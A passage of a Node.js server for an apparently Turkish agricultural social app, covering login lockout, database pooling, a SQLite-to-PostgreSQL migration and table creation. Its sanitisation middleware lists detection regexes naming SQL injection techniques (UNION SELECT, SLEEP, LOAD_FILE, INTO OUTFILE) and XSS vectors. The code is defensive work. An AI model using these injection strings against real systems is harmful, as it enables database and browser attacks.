    if (entry.lockedUntil && Date.now() >= entry.lockedUntil) accountFailedAttempts.delete(key);
    return { locked: false };
}

function recordFailedLogin(identifier) {
    const key   = identifier.toLowerCase().trim();
    const entry = accountFailedAttempts.get(key) || { count: 0, lockedUntil: null };
    entry.count++;
    if (entry.count >= MAX_FAILED_LOGINS) {
        entry.lockedUntil = Date.now() + LOCKOUT_DURATION_MS;
        console.log(`🔒 Hesap kilitlendi: ${key} (${entry.count} başarısız deneme)`);
    }
    accountFailedAttempts.set(key, entry);
}

function clearFailedLogins(identifier) {
    accountFailedAttempts.delete(identifier.toLowerCase().trim());
}

setInterval(() => {
    const now = Date.now();
    for (const [key, entry] of accountFailedAttempts) {
        if (!entry.lockedUntil || now > entry.lockedUntil + LOCKOUT_DURATION_MS) {
            accountFailedAttempts.delete(key);
        }
    }
}, 10 * 60 * 1000);

// ==================== 🔒 SQL INJECTİON / XSS SANITIZE ====================

// ══════════════════════════════════════════════════════════════════════════
// 🔒 GİRDİ TEMİZLEME & SQL INJECTION KORUMASI
// ══════════════════════════════════════════════════════════════════════════

// SQL Injection pattern'leri — auth alanlarına özel sıkı kontrol
const SQL_INJECTION_PATTERNS = [
    // Klasik union/select saldırıları
    /(\bUNION\b\s*\bSELECT\b)/i,
    /(\bSELECT\b\s+.+\s+\bFROM\b)/i,
    /(\bINSERT\b\s+\bINTO\b)/i,
    /(\bUPDATE\b\s+.+\s+\bSET\b)/i,
    /(\bDELETE\b\s+\bFROM\b)/i,
    /(\bDROP\b\s+\bTABLE\b)/i,
    /(\bTRUNCATE\b\s+\bTABLE\b)/i,
    /(\bALTER\b\s+\bTABLE\b)/i,
    /(\bCREATE\b\s+\bTABLE\b)/i,
    /(\bEXEC\b\s*\()/i,
    /(\bEXECUTE\b\s*\()/i,
    // Boolean tabanlı injection
    /('\s*OR\s*'1'\s*=\s*'1)/i,
    /('\s*OR\s+1\s*=\s*1)/i,
    /('\s*OR\s+\d+\s*=\s*\d+)/i,
    /(--\s*$)/,                          // SQL yorum satırı
    /(\/\*[\s\S]*?\*\/)/,               // Blok yorum
    // Stacked queries
    /;\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC)/i,
    // Time-based blind injection
    /\bSLEEP\s*\(\s*\d+\s*\)/i,
    /\bWAITFOR\s+DELAY\b/i,
    /\bBENCHMARK\s*\(/i,
    /\bPG_SLEEP\s*\(/i,
    // Out-of-band
    /\bLOAD_FILE\s*\(/i,
    /\bINTO\s+OUTFILE\b/i,
    /\bINTO\s+DUMPFILE\b/i,
    // Hex encode kaçınma
    /0x[0-9a-fA-F]{4,}/,
    // CHAR/ASCII tabanlı
    /\bCHAR\s*\(\s*\d+/i,
    /\bASCII\s*\(\s*/i,
    // Casting saldırıları
    /\bCAST\s*\(\s*.+\s+AS\s+/i,
    /\bCONVERT\s*\(\s*.+,/i,
    // Null byte
    /\x00/,
    /%00/,
    // URL encoded tekrar denemesi
    /%27/,   // ' encoded
    /%22/,   // " encoded
    /%3B/i,  // ; encoded
];

// XSS pattern'leri
const XSS_PATTERNS = [
    /<script[\s\S]*?>[\s\S]*?<\/script>/i,
    /<iframe[\s\S]*?>/i,
    /javascript\s*:/i,
    /on(load|error|click|mouseover|focus|blur|change|submit|keydown|keyup|keypress)\s*=/i,
    /data\s*:\s*text\/html/i,
    /vbscript\s*:/i,
    /<svg[\s\S]*?on\w+/i,
    /expression\s*\(/i,
];

// Auth alanlarına özel format kuralları
const AUTH_FIELD_RULES = {
    email      : { maxLen: 254, pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, label: 'E-posta' },
    identifier : { maxLen: 254, label: 'E-posta/Kullanıcı adı' },
    username   : { maxLen: 50,  pattern: /^[a-zA-Z0-9._-]+$/, label: 'Kullanıcı adı' },
    name       : { maxLen: 100, label: 'Ad Soyad' },
    password   : { maxLen: 128, minLen: 8, label: 'Şifre', skipSqlCheck: true },
    code       : { maxLen: 10,  pattern: /^\d{4,8}$/, label: 'Doğrulama kodu' },
    token      : { maxLen: 512, label: 'Token' },
};

/**
 * Tek bir değeri SQL injection ve XSS açısından tarar
 * @returns {{ safe: boolean, reason: string }}
 */
function checkFieldSecurity(key, value, opts = {}) {
    if (typeof value !== 'string') return { safe: true };

    // Null byte
    if (value.includes('\x00') || value.includes('%00'))
        return { safe: false, reason: `${key}: Geçersiz karakter (null byte)` };

    // Path traversal
    if (value.includes('../') || value.includes('..\\') || value.includes('%2e%2e'))
        return { safe: false, reason: `${key}: Path traversal tespit edildi` };

    // Uzunluk
    const maxLen = opts.maxLen || 10000;
    if (value.length > maxLen)
        return { safe: false, reason: `${key}: Girdi çok uzun (max ${maxLen})` };

    // SQL injection — password hariç (bcrypt zaten korur)
    if (!opts.skipSqlCheck) {
        for (const pattern of SQL_INJECTION_PATTERNS) {
            if (pattern.test(value)) {
                console.warn(`[SQL INJECTION] Alan: ${key} | Pattern: ${pattern} | IP: (middleware)`);
                return { safe: false, reason: `${key}: Geçersiz karakter dizisi` };
            }
        }
    }

    // XSS — password ve token hariç
    if (!opts.skipXss) {
        for (const pattern of XSS_PATTERNS) {
            if (pattern.test(value))
                return { safe: false, reason: `${key}: Geçersiz içerik` };
        }
    }

    return { safe: true };
}

/**
 * Auth endpoint'leri için özel middleware
 * email, username, password, name, code, token alanlarını sıkı denetler
 */
function validateAuthInput(req, res, next) {
    const body = req.body || {};
    for (const [key, value] of Object.entries(body)) {
        if (typeof value !== 'string') continue;
        const rule = AUTH_FIELD_RULES[key] || {};
        const check = checkFieldSecurity(key, value, {
            maxLen      : rule.maxLen,
            skipSqlCheck: rule.skipSqlCheck || false,
            skipXss     : key === 'password' || key === 'token',
        });
        if (!check.safe) {
            console.warn(`[AUTH INPUT] Reddedildi: ${check.reason} | IP: ${req.ip}`);
            return res.status(400).json({ error: check.reason });
        }
        // Format kontrolü (email, username, code)
        if (rule.pattern && value.trim() && !rule.pattern.test(value.trim())) {
            return res.status(400).json({ error: `Geçersiz ${rule.label || key} formatı` });
        }
        // Min uzunluk (password)
        if (rule.minLen && value.length < rule.minLen) {
            return res.status(400).json({ error: `${rule.label || key} en az ${rule.minLen} karakter olmalı` });
        }
    }
    next();
}

/**
 * Genel body sanitize middleware (tüm endpoint'ler)
 */
function sanitizeInput(value) {
    if (typeof value !== 'string') return value;
    if (value.includes('\x00')) return '';
    return value
        .replace(/<script[\s\S]*?<\/script>/gi, '')
        .replace(/<iframe[\s\S]*?<\/iframe>/gi, '')
        .replace(/javascript\s*:/gi, '')
        .replace(/on\w+\s*=/gi, '')
        .trim();
}

const RAW_FIELDS = new Set(['password', 'bio', 'content', 'caption', 'description', 'message', 'text', 'comment', 'token']);

function sanitizeBody(req, res, next) {
    if (req.body && typeof req.body === 'object') {
        for (const key of Object.keys(req.body)) {
            const val = req.body[key];
            if (typeof val !== 'string') continue;

            if (val.includes('\x00') || val.includes('%00'))
                return res.status(400).json({ error: 'Geçersiz karakter tespit edildi' });

            if (val.includes('../') || val.includes('..\\') || val.includes('%2e%2e'))
                return res.status(400).json({ error: 'Geçersiz karakter tespit edildi' });

            if (val.length > 50000)
                return res.status(400).json({ error: 'Girdi çok uzun' });

            if (!RAW_FIELDS.has(key) && /<script|<iframe|javascript:/i.test(val))
                return res.status(400).json({ error: 'Geçersiz içerik tespit edildi' });
        }
    }
    next();
}


// ==================== PostgreSQL BAĞLANTISI ====================

// ╔══════════════════════════════════════════════════════════════════╗
// ║        ⚡ DB CONNECTION POOL — Yüksek eş zamanlılık            ║
// ╠══════════════════════════════════════════════════════════════════╣
// ║  max: worker başına bağlantı sayısı                             ║
// ║  Formül: (toplam_max / NUM_WORKERS) = worker başına            ║
// ║  Örn: 4 worker × 25 = 100 toplam bağlantı (PG max_conn=100)   ║
// ║  1000 eş zamanlı kullanıcı → çoğu cache'den yanıt alır        ║
// ║  DB bağlantısı sadece gerçek veri için kullanılır              ║
// ╚══════════════════════════════════════════════════════════════════╝
const POOL_MAX = parseInt(process.env.DB_POOL_MAX) || 25; // worker başına

const pool = new Pool({
    host    : process.env.DB_HOST     || 'localhost',
    port    : parseInt(process.env.DB_PORT) || 5432,
    database: process.env.DB_NAME     || 'agrolink',
    user    : process.env.DB_USER     || 'postgres',
    password: (() => {
        if (!process.env.DB_PASSWORD) {
            console.error('❌ HATA: DB_PASSWORD .env dosyasında tanımlı değil!');
            process.exit(1);
        }
        return process.env.DB_PASSWORD;
    })(),
    max                        : POOL_MAX,
    min                        : Math.max(2, Math.floor(POOL_MAX / 5)), // min %20
    idleTimeoutMillis          : 30_000,   // boşta 30s sonra kapat
    connectionTimeoutMillis    : 3_000,    // bağlantı 3s içinde gelmezse hata
    statement_timeout          : 8_000,    // sorgu 8s içinde bitmezse iptal
    query_timeout              : 8_000,
    allowExitOnIdle            : false,
    keepAlive                  : true,
    keepAliveInitialDelayMillis: 10_000,
    // ⚡ Prepared statement cache — tekrar eden sorguları hızlandırır
    application_name           : 'agrolink_server',
});

// Pool izleme — yüksek bağlantı kullanımını logla
setInterval(() => {
    const used  = pool.totalCount - pool.idleCount;
    const pct   = Math.round((used / POOL_MAX) * 100);
    if (pct > 80) {
        console.warn(`⚠️  [DB POOL] Yüksek kullanım: ${used}/${POOL_MAX} (%${pct})`);
    }
}, 30_000);

pool.on('connect', () => {
    console.log('✅ PostgreSQL bağlantısı kuruldu');
});

pool.on('error', (err) => {
    console.error('❌ PostgreSQL havuz hatası:', err.message);
});

// ==================== YARDIMCI DB FONKSİYONLARI ====================

async function dbGet(sql, params = []) {
    const result = await pool.query(sql, params);
    return result.rows[0] || null;
}

async function dbAll(sql, params = []) {
    const result = await pool.query(sql, params);
    return result.rows;
}

async function dbRun(sql, params = []) {
    const result = await pool.query(sql, params);
    return { changes: result.rowCount, lastID: result.rows[0]?.id };
}

// ==================== SQLite → PostgreSQL MİGRASYON ====================
//
//  Nasıl çalışır?
//  - Sunucu başlarken SQLITE_MIGRATE=true env varı varsa SQLite → PG'ye kopyalar.
//  - Migrasyon bir kez tamamlanınca bayrak dosyası (.migration_done) oluşur.
//  - Sonraki başlatmalarda bayrak dosyası varsa migrasyon atlanır.
//  - SQLITE_PATH env varıyla sqlite dosya konumunu belirtebilirsin (varsayılan: ./agrolink.db).
//
//  Kullanım:
//    SQLITE_MIGRATE=true SQLITE_PATH=./agrolink.db node agrolink-server-pg-FIXED.js
//

const MIGRATION_FLAG = '.migration_done';
const SQLITE_PATH    = process.env.SQLITE_PATH || './agrolink.db';
const MIGRATION_BATCH = 200;

const migBool    = (v) => v === 1 || v === true || v === '1';
const migNull    = (v) => (v === '' || v === undefined ? null : v);
const migJson    = (v) => {
    if (v === null || v === undefined) return null;
    if (typeof v === 'object') return v;
    try { return JSON.parse(v); } catch { return null; }
};

async function migInsert(client, table, rows, buildRow, onConflict = '') {
    if (!rows || !rows.length) {
        console.log(`  ⏭  ${table}: boş, atlandı`);
        return;
    }
    let ok = 0, skip = 0;
    for (const row of rows) {
        try {
            const obj    = buildRow(row);
            const keys   = Object.keys(obj);
            const vals   = Object.values(obj);
            const cols   = keys.map(k => `"${k}"`).join(', ');
            const params = keys.map((_, i) => `$${i + 1}`).join(', ');
            await client.query(
                `INSERT INTO "${table}" (${cols}) VALUES (${params}) ${onConflict}`,
                vals
            );
            ok++;
        } catch (e) {
            skip++;
            if (e.code !== '23505') console.warn(`  ⚠  ${table}: ${e.message}`);
        }
    }
    console.log(`  ✅ ${table}: ${ok} kayıt aktarıldı${skip ? `, ${skip} atlandı` : ''}`);
}

async function runSQLiteMigration() {
    // --- ön kontroller ---
    if (!process.env.SQLITE_MIGRATE) return;                        // env yoksa çalışma
    if (!sqlite3Mod || !sqliteOpen) {
        console.warn('⚠️  Migrasyon: sqlite3/sqlite paketi bulunamadı. npm install sqlite3 sqlite');
        return;
    }
    const fssync2 = require('fs');
    if (fssync2.existsSync(MIGRATION_FLAG)) {
        console.log('ℹ️  Migrasyon zaten tamamlanmış (.migration_done mevcut), atlanıyor.');
        return;
    }
    if (!fssync2.existsSync(SQLITE_PATH)) {
        console.warn(`⚠️  Migrasyon: SQLite dosyası bulunamadı: ${SQLITE_PATH}`);
        return;
    }

    console.log('\n🔄 ============================================');
    console.log('   AGROLINK — SQLite → PostgreSQL Migrasyonu ');
    console.log(`   Kaynak: ${SQLITE_PATH}`);
    console.log('==============================================\n');

    const sdb = await sqliteOpen({ filename: SQLITE_PATH, driver: sqlite3Mod.Database });
    const client = await pool.connect();

    try {
        // FK kısıtlamalarını geçici olarak devre dışı bırak
        await client.query('SET session_replication_role = replica');

        // ── users ──────────────────────────────────────────
        const users = await sdb.all('SELECT * FROM users').catch(() => []);
        await migInsert(client, 'users', users, (r) => ({
            id              : r.id,
            name            : r.name,
            username        : r.username,
            email           : r.email,
            password        : r.password,
            profilePic      : migNull(r.profilePic),
            coverPic        : migNull(r.coverPic),
            bio             : r.bio || '',
            website         : migNull(r.website),
            isPrivate       : migBool(r.isPrivate),
            isActive        : migBool(r.isActive !== undefined ? r.isActive : 1),
            role            : r.role || 'user',
            location        : migNull(r.location),
            language        : r.language || 'tr',
            emailVerified   : migBool(r.emailVerified),
            twoFactorEnabled: migBool(r.twoFactorEnabled !== undefined ? r.twoFactorEnabled : 1),
            isVerified      : migBool(r.isVerified),
            hasFarmerBadge  : migBool(r.hasFarmerBadge),
            userType        : r.userType || 'normal_kullanici',
            lastSeen        : migNull(r.lastSeen),
            lastLogin       : migNull(r.lastLogin),
            isOnline        : migBool(r.isOnline),
            registrationIp  : migNull(r.registrationIp),
            verifiedAt      : migNull(r.verifiedAt),
            createdAt       : r.createdAt || new Date().toISOString(),
            updatedAt       : r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── posts ──────────────────────────────────────────
        const posts = await sdb.all('SELECT * FROM posts').catch(() => []);
        await migInsert(client, 'posts', posts, (r) => ({
            id           : r.id,
            userId       : r.userId,
            username     : r.username,
            content      : migNull(r.content),
            media        : migNull(r.media),
            mediaType    : r.mediaType || 'text',
            originalWidth : r.originalWidth || null,
            originalHeight: r.originalHeight || null,
            views        : r.views || 0,
            likeCount    : r.likeCount || 0,
            commentCount : r.commentCount || 0,
            saveCount    : r.saveCount || 0,
            isPoll       : migBool(r.isPoll),
            pollQuestion : migNull(r.pollQuestion),
            pollOptions  : migJson(r.pollOptions),
            latitude     : r.latitude || null,
            longitude    : r.longitude || null,
            locationName : migNull(r.locationName),
            allowComments: r.allowComments !== undefined ? migBool(r.allowComments) : true,
            isActive     : r.isActive !== undefined ? migBool(r.isActive) : true,
            createdAt    : r.createdAt || new Date().toISOString(),
            updatedAt    : r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── comments ───────────────────────────────────────
        const comments = await sdb.all('SELECT * FROM comments').catch(() => []);
        await migInsert(client, 'comments', comments, (r) => ({
            id       : r.id,
            postId   : r.postId,
            userId   : r.userId,
            username : r.username,
            content  : r.content,
            parentId : migNull(r.parentId),
            likeCount: r.likeCount || 0,
            createdAt: r.createdAt || new Date().toISOString(),
            updatedAt: r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── likes ──────────────────────────────────────────
        const likes = await sdb.all('SELECT * FROM likes').catch(() => []);
        await migInsert(client, 'likes', likes, (r) => ({
            id       : r.id,
            postId   : r.postId,
            userId   : r.userId,
            createdAt: r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT ("postId", "userId") DO NOTHING');

        // ── follows ────────────────────────────────────────
        const follows = await sdb.all('SELECT * FROM follows').catch(() => []);
        await migInsert(client, 'follows', follows, (r) => ({
            id         : r.id,
            followerId : r.followerId,
            followingId: r.followingId,
            createdAt  : r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT ("followerId", "followingId") DO NOTHING');

        // ── messages ───────────────────────────────────────
        const messages = await sdb.all('SELECT * FROM messages').catch(() => []);
        await migInsert(client, 'messages', messages, (r) => ({
            id               : r.id,
            senderId         : r.senderId,
            senderUsername   : r.senderUsername,
            recipientId      : r.recipientId,
            recipientUsername: r.recipientUsername,
            content          : r.content,
            read             : migBool(r.read),
            readAt           : migNull(r.readAt),
            createdAt        : r.createdAt || new Date().toISOString(),
            updatedAt        : r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── notifications ──────────────────────────────────
        const notifs = await sdb.all('SELECT * FROM notifications').catch(() => []);
        await migInsert(client, 'notifications', notifs, (r) => ({
            id       : r.id,
            userId   : r.userId,
            type     : r.type,
            message  : r.message,
            data     : migJson(r.data),
            read     : migBool(r.read),
            readAt   : migNull(r.readAt),
            createdAt: r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── products ───────────────────────────────────────
        const products = await sdb.all('SELECT * FROM products').catch(() => []);
        await migInsert(client, 'products', products, (r) => ({
            id         : r.id,
            sellerId   : r.sellerId,
            name       : r.name,
            price      : r.price,
            description: migNull(r.description),
            image      : migNull(r.image),
            images     : migJson(r.images),
            category   : migNull(r.category),
            stock      : r.stock || 1,
            isActive   : migBool(r.isActive !== undefined ? r.isActive : 1),
            createdAt  : r.createdAt || new Date().toISOString(),
            updatedAt  : r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── saves ──────────────────────────────────────────
        const saves = await sdb.all('SELECT * FROM saves').catch(() => []);
        await migInsert(client, 'saves', saves, (r) => ({
            id       : r.id,
            postId   : r.postId,
            userId   : r.userId,
            createdAt: r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT ("postId", "userId") DO NOTHING');

        // ── blocks ─────────────────────────────────────────
        const blocks = await sdb.all('SELECT * FROM blocks').catch(() => []);
        await migInsert(client, 'blocks', blocks, (r) => ({
            id       : r.id,
            blockerId: r.blockerId,
            blockedId: r.blockedId,
            createdAt: r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT ("blockerId", "blockedId") DO NOTHING');

        // ── hashtags ───────────────────────────────────────
        const hashtags = await sdb.all('SELECT * FROM hashtags').catch(() => []);
        await migInsert(client, 'hashtags', hashtags, (r) => ({
            id       : r.id,
            tag      : r.tag,
            postCount: r.postCount || 1,
            createdAt: r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT (tag) DO NOTHING');

        // ── post_hashtags ──────────────────────────────────
        const phash = await sdb.all('SELECT * FROM post_hashtags').catch(() => []);
        await migInsert(client, 'post_hashtags', phash, (r) => ({
            id       : r.id,
            postId   : r.postId,
            hashtagId: r.hashtagId,
        }), 'ON CONFLICT ("postId", "hashtagId") DO NOTHING');

        // ── video_info ─────────────────────────────────────
        const vids = await sdb.all('SELECT * FROM video_info').catch(() => []);
        await migInsert(client, 'video_info', vids, (r) => ({
            id         : r.id,
            postId     : r.postId,
            duration   : r.duration || null,
            width      : r.width    || null,
            height     : r.height   || null,
            aspectRatio: migNull(r.aspectRatio),
            bitrate    : r.bitrate  || null,
            codec      : migNull(r.codec),
            fileSize   : r.fileSize || null,
            createdAt  : r.createdAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── content_moderation ─────────────────────────────
        const mods = await sdb.all('SELECT * FROM content_moderation').catch(() => []);
        await migInsert(client, 'content_moderation', mods, (r) => ({
            id          : r.id,
            postId      : migNull(r.postId),
            commentId   : migNull(r.commentId),
            userId      : r.userId,
            content     : r.content,
            harmfulScore: r.harmfulScore || 0,
            isHarmful   : migBool(r.isHarmful),
            reason      : migNull(r.reason),
            moderatedAt : r.moderatedAt || new Date().toISOString(),
        }), 'ON CONFLICT (id) DO NOTHING');

        // ── account_restrictions ───────────────────────────
        const restr = await sdb.all('SELECT * FROM account_restrictions').catch(() => []);
        await migInsert(client, 'account_restrictions', restr, (r) => ({
            id             : r.id,
            userId         : r.userId,
            isRestricted   : migBool(r.isRestricted),
            restrictedAt   : migNull(r.restrictedAt),
            restrictedUntil: migNull(r.restrictedUntil),
            reason         : migNull(r.reason),
            canPost        : migBool(r.canPost),
            canComment     : migBool(r.canComment),
            canMessage     : migBool(r.canMessage),
            canFollow      : migBool(r.canFollow),
            canLike        : migBool(r.canLike),
            createdAt      : r.createdAt || new Date().toISOString(),
            updatedAt      : r.updatedAt || new Date().toISOString(),
        }), 'ON CONFLICT ("userId") DO NOTHING');

        // ── banned_ips ─────────────────────────────────────
        const bips = await sdb.all('SELECT * FROM banned_ips').catch(() => []);
        await migInsert(client, 'banned_ips', bips, (r) => ({
            id      : r.id,
            ip      : r.ip,
            reason  : migNull(r.reason),
            bannedAt: r.bannedAt || new Date().toISOString(),
        }), 'ON CONFLICT (ip) DO NOTHING');

        // FK kısıtlamalarını geri aç
        await client.query('SET session_replication_role = DEFAULT');

        // Migrasyon tamamlandı bayrağını yaz
        fssync2.writeFileSync(MIGRATION_FLAG, new Date().toISOString());

        console.log('\n✅ Migrasyon tamamlandı! Tüm veriler PostgreSQL\'e aktarıldı.');
        console.log('🚀 Sunucu normal çalışmaya devam ediyor...\n');

    } catch (err) {
        await client.query('SET session_replication_role = DEFAULT').catch(() => {});
        console.error('❌ Migrasyon hatası:', err.message);
        console.error('   Sunucu yine de başlatılıyor — veriler kısmen aktarılmış olabilir.');
    } finally {
        client.release();
        await sdb.close().catch(() => {});
    }
}

// ╔══════════════════════════════════════════════════════════════════╗
// ║          ⚡ MERKEZI CACHE SİSTEMİ — LRU + TTL                  ║
// ╠══════════════════════════════════════════════════════════════════╣
// ║  Neden önemli?                                                   ║
// ║  • Aynı sorgu saniyede 1000 kez gelebilir (viral post)          ║
// ║  • DB her seferinde çalışmak zorunda → bağlantı havuzu dolar   ║
// ║  • Cache ile yanıt 10ms, DB ile 50-200ms                        ║
// ╠══════════════════════════════════════════════════════════════════╣
// ║  TTL Süreler:                                                    ║
// ║  • Feed          : 30s   (sık değişir)                          ║
// ║  • Profil        : 60s   (nadir değişir)                        ║
// ║  • Post detay    : 30s   (like/comment sayısı değişir)          ║
// ║  • Trending/Top  : 5dk   (nadiren değişir)                      ║
// ║  • Hava durumu   : 10dk  (API'den gelir, pahalı)               ║
// ╚══════════════════════════════════════════════════════════════════╝

class LRUCache {
    constructor(maxSize = 500, defaultTTL = 30000) {
        this.maxSize    = maxSize;
        this.defaultTTL = defaultTTL;
        this.map        = new Map(); // key → { value, expiry, hits }
    }
    get(key) {
        const entry = this.map.get(key);
        if (!entry) return null;
        if (Date.now() > entry.expiry) { this.map.delete(key); return null; }
        entry.hits++;
        // LRU: sona taşı
        this.map.delete(key);
        this.map.set(key, entry);
        return entry.value;
    }
    set(key, value, ttl) {
        // Limit aşıldıysa en eskiyi sil
        if (this.map.size >= this.maxSize) {
            this.map.delete(this.map.keys().next().value);
        }
        if (this.map.has(key)) this.map.delete(key);
        this.map.set(key, { value, expiry: Date.now() + (ttl || this.defaultTTL), hits: 0 });
    }
    del(key)      { this.map.delete(key); }
    delPattern(prefix) {
        for (const k of this.map.keys()) { if (k.startsWith(prefix)) this.map.delete(k); }
    }
    flush()       { this.map.clear(); }
    size()        { return this.map.size; }
    stats()       {
        let totalHits = 0;
        for (const e of this.map.values()) totalHits += e.hits;
        return { size: this.map.size, maxSize: this.maxSize, totalHits };
    }
    // Süresi dolmuş kayıtları temizle
    purge() {
        const now = Date.now();
        for (const [k, e] of this.map) { if (now > e.expiry) this.map.delete(k); }
    }
}

// Cache örnekleri — her alan kendi boyut/TTL ayarına sahip
const AppCache = {
    feed     : new LRUCache(500,  45_000),   // Feed: 500 kullanıcı × 45s (↑ 200→500, 30→45)
    post     : new LRUCache(1000, 60_000),   // Post detayları: 1000 post × 60s (↑ 500→1000, 30→60)
    profile  : new LRUCache(500,  90_000),   // Profil: 500 kullanıcı × 90s (↑ 300→500, 60→90)
    trending : new LRUCache(10,   300_000),  // Trending: 5dk TTL
    weather  : new LRUCache(50,   600_000),  // Hava: 10dk TTL
    suggest  : new LRUCache(200,  180_000),  // Önerilen kullanıcılar: 3dk (↑ 100→200, 2→3dk)
};

// Periyodik temizlik — her 2 dakikada süresi dolanları sil
setInterval(() => {
    for (const c of Object.values(AppCache)) c.purge();
}, 120_000);


// ==================== TABLO OLUŞTURMA (UUID FIX) ====================

async function initializeDatabase() {
    console.log('📦 PostgreSQL tabloları oluşturuluyor (UUID)...');

    // UUID extension'ı aktif et
    await pool.query('CREATE EXTENSION IF NOT EXISTS "uuid-ossp"');

    // 🔒 pgcrypto: Hassas kolon şifrelemesi için (pgp_sym_encrypt / pgp_sym_decrypt)
    await pool.query('CREATE EXTENSION IF NOT EXISTS pgcrypto').catch(e =>
        console.warn('⚠️  pgcrypto yüklenemedi (superuser gerekebilir):', e.message)
    );

    await pool.query(`
        CREATE TABLE IF NOT EXISTS users (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            name TEXT NOT NULL,
            username TEXT UNIQUE NOT NULL,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            "profilePic" TEXT,
            "coverPic" TEXT,
            bio TEXT DEFAULT '',
            website TEXT,
            "isPrivate" BOOLEAN DEFAULT FALSE,
            "isActive" BOOLEAN DEFAULT TRUE,
            role TEXT DEFAULT 'user',
            location TEXT,
            language TEXT DEFAULT 'tr',
            "emailVerified" BOOLEAN DEFAULT FALSE,
            "twoFactorEnabled" BOOLEAN DEFAULT FALSE,
            "isVerified" BOOLEAN DEFAULT FALSE,
            "hasFarmerBadge" BOOLEAN DEFAULT FALSE,
            "userType" TEXT DEFAULT 'normal_kullanici',
            "lastSeen" TIMESTAMPTZ,
            "lastLogin" TIMESTAMPTZ,
            "isOnline" BOOLEAN DEFAULT FALSE,
            "isBanned" BOOLEAN DEFAULT FALSE,
            "registrationIp" TEXT,
            "verifiedAt" TIMESTAMPTZ,
            plan TEXT DEFAULT 'free',
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);
    
    // Plan sütunu yoksa ekle (migration)
    try {
        await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS plan TEXT DEFAULT 'free'`);
    } catch (e) {
        console.log('ℹ️ Plan sütunu zaten var veya hata:', e.message);
    }

    await pool.query(`
        CREATE TABLE IF NOT EXISTS posts (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            username TEXT NOT NULL,
            content TEXT,
            media TEXT,
            "mediaType" TEXT DEFAULT 'text',
            "originalWidth" INTEGER,
            "originalHeight" INTEGER,
            views INTEGER DEFAULT 0,
            "likeCount" INTEGER DEFAULT 0,
            "commentCount" INTEGER DEFAULT 0,
            "saveCount" INTEGER DEFAULT 0,
            "isPoll" BOOLEAN DEFAULT FALSE,
            "pollQuestion" TEXT,
            "pollOptions" JSONB,
            latitude DOUBLE PRECISION,
            longitude DOUBLE PRECISION,
            "locationName" TEXT,
            "allowComments" BOOLEAN DEFAULT TRUE,
            "thumbnailUrl" TEXT,
            "isActive" BOOLEAN DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS comments (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            username TEXT NOT NULL,
            content TEXT NOT NULL,
            "parentId" UUID,
            "likeCount" INTEGER DEFAULT 0,
            "isActive" BOOLEAN DEFAULT TRUE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS likes (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "postId" UUID NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("postId", "userId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS follows (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "followerId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "followingId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            UNIQUE("followerId", "followingId")
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS messages (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "senderId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "senderUsername" TEXT NOT NULL,
            "recipientId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            "recipientUsername" TEXT NOT NULL,
            content TEXT NOT NULL,
            read BOOLEAN DEFAULT FALSE,
            "readAt" TIMESTAMPTZ,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            "updatedAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS notifications (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            "userId" UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            type TEXT NOT NULL,
            message TEXT NOT NULL,
            data JSONB,
            read BOOLEAN DEFAULT FALSE,
            "readAt" TIMESTAMPTZ,
            "createdAt" TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
    `);

    await pool.query(`
        CREATE TABLE IF NOT EXISTS products (
